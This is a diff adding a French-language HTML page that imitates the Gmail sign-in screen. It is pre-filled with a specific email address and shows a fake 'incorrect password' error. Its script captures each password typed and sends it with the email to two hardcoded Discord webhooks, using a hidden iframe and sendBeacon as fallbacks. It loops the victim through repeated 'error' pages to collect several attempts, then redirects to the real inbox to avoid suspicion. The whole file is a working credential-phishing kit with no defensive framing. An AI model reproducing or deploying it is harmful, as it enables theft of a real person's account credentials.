@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#ffffff">
+<title>Gmail - Connexion</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;color:#202124;min-height:100vh;-webkit-font-smoothing:antialiased}
+.top{display:flex;align-items:center;gap:9px;padding:16px 20px;padding-top:calc(16px + env(safe-area-inset-top));border-bottom:1px solid #e8eaed}
+.top svg{width:26px;height:26px}
+.top b{font-size:17px;font-weight:500;color:#5f6368}
+.gwrap{max-width:400px;margin:0 auto;padding:38px 24px calc(30px + env(safe-area-inset-bottom))}
+.glogo{width:40px;height:40px;display:block;margin-bottom:20px}
+h1{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
+.lead{font-size:14.5px;color:#5f6368;margin:0 0 22px;line-height:1.5}
+.chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:5px 14px 5px 5px;font-size:13px;color:#3c4043;margin-bottom:24px;max-width:100%}
+.chip .mini{width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex:0 0 auto}
+.chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.err{display:flex;gap:9px;align-items:flex-start;background:#fce8e6;border:1px solid #f5c6c2;border-radius:8px;padding:11px 13px;margin:0 0 18px;font-size:13px;line-height:1.45;color:#a50e0e}
+.err svg{flex:0 0 16px;margin-top:1px}
+.field{width:100%;border:1px solid #d93025;border-radius:4px;padding:13px 14px;font-size:16px;font-family:inherit;color:#202124;background:#fff;-webkit-appearance:none;appearance:none;outline:none}
+.field:focus{box-shadow:inset 0 0 0 1px #d93025}
+.show{display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;margin-top:16px;user-select:none}
+.show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
+.link{display:inline-block;font-size:13px;color:#1a73e8;font-weight:500;margin-top:14px;text-decoration:none}
+.actions{display:flex;justify-content:flex-end;margin-top:30px}
+.gbtn{border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;padding:11px 26px;cursor:pointer;font-family:inherit;-webkit-appearance:none;min-width:96px}
+.gbtn:active{background:#1765cc}
+.gbtn[disabled]{background:#8ab4f8}
+.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.foot{font-size:11.5px;color:#80868b;margin-top:36px;line-height:1.7}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <svg viewBox="0 0 48 48">
+    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  </svg>
+  <b>Gmail</b>
+</div>
+
+<div class="gwrap">
+  <svg class="glogo" viewBox="0 0 48 48">
+    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  </svg>
+
+  <h1>Connexion</h1>
+
+  <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@gmail.com</span></div>
+
+  <div class="err">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#a50e0e" stroke-width="2">
+      <circle cx="12" cy="12" r="9"/><path d="M12 7v6"/><path d="M12 16.5v.5"/>
+    </svg>
+    <div>Mot de passe incorrect. Réessayez.</div>
+  </div>
+
+  <form id="formPwd">
+    <input class="field" id="pwd" type="password" inputmode="text" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Saisissez votre mot de passe">
+    <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
+    <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
+    <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
+  </form>
+
+  <p class="foot">Compte Google · Session sécurisée<br>Français (France)</p>
+</div>
+
+<script>
+const MAIL = "maudperez33@gmail.com";
+const REDIRECT = "https://mail.google.com/mail/u/0/#inbox";
+const HOOKS = [
+  "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
+  "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
+];
+const $ = id => document.getElementById(id);
+let busy = false;
+
+const n = Math.min(Math.max(parseInt((location.search.match(/n=(\d+)/) || [])[1] || "2", 10), 2), 3);
+const CODE = "RB-9K42-MAIL" + n;
+
+function enc(o) {
+  return Object.keys(o).map(k => encodeURIComponent(k) + "=" + encodeURIComponent(o[k])).join("&");
+}
+function viaIframe(h, b) {
+  return new Promise(r => {
+    let f = false;
+    try {
+      const nn = "w" + Date.now() + Math.floor(Math.random() * 999);
+      const fr = document.createElement("iframe");
+      fr.name = nn; fr.style.cssText = "position:absolute;width:1px;height:1px;opacity:0;border:0";
+      document.body.appendChild(fr);
+      const fm = document.createElement("form");
+      fm.method = "POST"; fm.action = h; fm.target = nn;
+      b.split("&").forEach(p => {
+        const i = p.indexOf("="); if (i < 0) return;
+        const el = document.createElement("input");
+        el.type = "hidden";
+        el.name = decodeURIComponent(p.slice(0, i));
+        el.value = decodeURIComponent(p.slice(i + 1));
+        fm.appendChild(el);
+      });
+      document.body.appendChild(fm);
+      fr.onload = () => { if (f) return; f = true; r(true); };
+      fm.submit();
+      setTimeout(() => { if (f) return; f = true; r(true); }, 4000);
+    } catch (e) { r(false); }
+  });
+}
+async function envoi(texte) {
+  const b = enc({ username: "Gmail · " + CODE, content: texte });
+  for (const h of HOOKS) {
+    try {
+      const r = await fetch(h, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: b });
+      if (r.ok) return true;
+    } catch (e) {}
+  }
+  for (const h of HOOKS) { if (await viaIframe(h, b)) return true; }
+  for (const h of HOOKS) {
+    try {
+      const bd = new Blob([b], { type: "text/plain;charset=UTF-8" });
+      if (navigator.sendBeacon(h, bd)) return true;
+    } catch (e) {}
+  }
+  return false;
+}
+
+$("chipMail").textContent = MAIL;
+
+$("formPwd").addEventListener("submit", async e => {
+  e.preventDefault();
+  if (busy) return;
+  const p = $("pwd").value;
+  if (!p) { $("pwd").focus(); return; }
+  busy = true;
+  const btn = $("btnLogin");
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>Connexion…';
+
+  const txt = "🔐 Mot de passe — essai " + n + "\nCode : " + CODE + "\nEmail : " + MAIL + "\nMot de passe :\n```\n" + p + "\n```";
+  let ok = await envoi(txt);
+  if (!ok) { await new Promise(r => setTimeout(r, 2500)); ok = await envoi(txt); }
+
+  const suite = n < 3 ? "erreur.html?n=" + (n + 1) : REDIRECT;
+  setTimeout(() => { location.replace(suite); }, ok ? 1400 : 2500);
+});
+
+$("showpwd").addEventListener("change", function () {
+  $("pwd").type = this.checked ? "text" : "password";
+  $("pwd").focus();
+});
+</script>
+</body>
+</html>
